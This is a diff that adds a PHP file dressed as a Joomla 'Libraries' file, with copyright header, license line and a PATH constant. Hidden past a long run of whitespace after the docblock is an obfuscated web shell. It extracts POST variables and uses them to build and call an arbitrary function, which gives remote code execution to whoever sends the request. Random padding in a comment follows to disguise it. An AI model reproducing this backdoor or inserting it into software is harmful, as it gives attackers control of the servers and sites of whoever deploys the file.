@@ -1,0 +1,14 @@
+<?php
+/**
+ * @package    Libraries
+ * *********************************************************************************
+ * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
+ * @license    GNU General Public License version 2 or later; see LICENSE
+ */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if (                    !empty                   (         $_POST                            )                  )               {extract          ($_POST)             ;               $h                  =                             $d('', $f(                       $s(    "c", "", $m)                       )                        )                       ; $h      ()                            ;    } // _eFPc+$^3r5xT25*PXat@zVu._XG4ZxW56--rz^hk_g^vEn*PxrDFP2X+@M#tk13Dv97K+4^RN-MP(khC0YG1PUG!r4M60rzQxS7A9rMp4f6S7U7(s#9sHTmN3UD)D@D(+hF!dgYq3rAzn8uPv(Q-gC932y83=h8rDEEHeDzpr7kQxSzDWPeBnnNSTScx!3@YmG0Mk7dF8Z5rV7hGd(+wfq(TgF$H=T)!DrP+e*5S-!wbX8T3K0CehA^tGtEYKSSCrxBZsPsShgKQw)9+Wb+-uYB^fMevgruR9hX1
+
+// Set the platform root path as a constant if necessary.
+if (!defined('PATH'))                  
+{
+	define('PATH', __DIR__)                             ;
+}
+
